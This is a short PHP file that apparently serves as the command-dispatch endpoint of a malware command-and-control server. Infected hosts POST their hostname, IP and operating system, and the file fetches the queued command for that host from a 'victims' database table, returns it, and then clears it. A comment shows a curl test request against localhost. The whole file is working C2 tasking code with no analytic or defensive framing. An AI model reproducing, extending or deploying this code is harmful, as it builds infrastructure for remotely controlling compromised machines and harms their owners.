<?php
// curl -d "hostname=RegisterTest&ip=127.0.0.1&os=win" -X POST http://localhost/getCmd.php
include 'conn.php';
if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["hostname"]) && isset($_POST["ip"]) && isset($_POST["os"])){
  $cmdQuery = $mysql->prepare("select cmd from victims where hostname=? and ip=? and os=?");
  $cmdQuery->bind_param("sss", $_POST["hostname"], $_POST["ip"], $_POST["os"]);
  $cmdQuery->execute();
  $cmdQuery->store_result();
  $cmdQuery->bind_result($cmd);
  $cmdQuery->fetch();
  echo $cmd . "\n";
  $rmvCmd = $mysql->prepare("update victims set cmd='' where hostname=? and ip=?");
  $rmvCmd->bind_param("ss", $_POST["hostname"], $_POST["ip"]);
  $rmvCmd->execute();
}

 ?>
